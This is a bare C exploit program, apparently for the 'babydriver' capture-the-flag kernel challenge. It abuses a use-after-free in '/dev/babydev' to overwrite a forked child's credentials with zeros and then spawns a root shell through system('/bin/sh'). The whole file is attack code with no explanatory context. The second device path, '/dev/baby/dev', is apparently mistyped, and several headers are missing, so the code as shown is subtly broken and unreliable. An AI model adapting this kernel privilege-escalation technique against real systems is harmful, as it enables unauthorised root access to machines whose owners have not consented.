#include<stdio.h>
#include<fcntl.h>
#include<sys/wait.h>

int main(){
    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/baby/dev", 2);

    ioctl(fd1, 65537, 168);

    close(fd1);

    int pid = fork();

    if(pid < 0){
        puts("error!");
        exit(0);
    }
    else if (pid == 0)
    {
        int a[6] = {0};
        write(fd2, a, 24);
        puts("get shell!");
        system("/bin/sh");
    }
    else{
        wait(NULL);
    }

    return 0;

}